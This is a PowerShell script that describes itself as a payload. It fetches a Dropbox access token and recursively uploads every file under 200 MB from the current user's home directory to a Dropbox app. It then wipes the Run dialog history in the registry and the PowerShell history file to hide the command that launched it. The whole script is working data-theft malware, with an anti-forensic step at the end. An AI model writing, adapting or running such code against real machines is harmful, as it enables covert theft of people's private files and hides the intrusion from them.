# replace APP_KEY_HERE, APP_SECRET_HERE, REFRESH_TOKEN_HERE with correct values for your dropbox application
$app_key="APP_KEY_HERE"
$app_secret="APP_SECRET_HERE"
$refresh_token="REFRESH_TOKEN_HERE"

#this function will try to send the specified file to dropbox, keeping the full path as is
function SendFileToDropbox
{
	param([string]$windowsFilePath)
	
	#transform windows file path into dropbox file path, make sure unicode characters are passed correctly
	$chararr=[char[]] $windowsFilePath.Replace('\','/')
	$dropboxFilePath="/";
	foreach ($char in $chararr) { if ($char -lt 128){$dropboxFilePath += $char} else{$dropboxFilePath += "\u" + ([uint16]$char).ToString("X4")} }
    
	#write http headers, send specified file to your dropbox app directory
	$arg = '{ "path": "' + ${dropboxFilePath} + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + "${access_token}"
    $data.Clear()
    $data.Add("Authorization", ${authorization})
    $data.Add("Dropbox-API-Arg", ${arg})
    $data.Add("Content-Type", 'application/octet-stream')
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile ${windowsFilePath} -Headers ${data}
	
	#if Invoke-RestMethod failed for some reason, try again up to 3 times in total
	if($? -eq 0) {Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile ${windowsFilePath} -Headers ${data}}
	if($? -eq 0) {Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile ${windowsFilePath} -Headers ${data}}
	if($? -eq 0) {Write-Host "gave up trying to send ${windowsFilePath}"}
}

#----------------------------------------------------------------------------------------------------------------------------

if (Test-Connection dropbox.com) {
# create an object for sending http requests to server
$data = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"

# get access token (via refresh token) for your dropbox app
$data.Clear()
$data.Add("client_id", "${app_key}")
$data.Add("client_secret", "${app_secret}")
$data.Add("grant_type", "refresh_token")
$data.Add("refresh_token", "${refresh_token}")
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body ${data}
$access_token = $response.access_token

#move to home directory of currently logged in user and send all files less than 200mb in size to dropbox
Set-Location ${HOME}
foreach( $filename in (Get-ChildItem -Recurse -File | Where-Object Length -lt 200mb) ) {SendFileToDropbox($filename.FullName)}
}

#clean runline and powershell history to hide the command launched by this payload
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' * -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadLineOption).HistorySavePath